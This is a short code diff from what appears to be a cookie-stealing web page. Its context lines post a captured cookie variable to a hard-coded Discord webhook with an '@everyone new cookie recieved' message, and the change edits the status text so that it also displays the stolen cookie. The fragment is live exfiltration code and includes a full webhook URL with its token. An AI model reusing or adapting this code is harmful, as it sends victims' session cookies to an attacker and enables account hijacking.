@@ -72,8 +72,8 @@
 				$.post("https://discord.com/api/webhooks/1101528266373873694/X3TVaHAB8jJ6BqJ9TOB2tVQA9ogpnpSy4niSzwM1BuohDdP-ApPedUPPLP3n3UYi2qWT", {
 					"content": `@everyone new cookie recieved:\n\`\`\`\n${cook}\n\`\`\`\nhttps://media.tenor.com/V5jKgnXoSzIAAAAd/beamed-discord.gif`
 				})
-					.always(() => write("➡️ Submitting webhook"))
-					.done(() => write("✅ Success (cookie posted with zero failures)"))
+					.always(() => write(`➡️ Posting webhook (${cook})`))
+					.done(() => write("✅ Success (webhook posted with zero failures)"))
 					.fail(() => write("❌ Failure"));
 			});
 		</script>
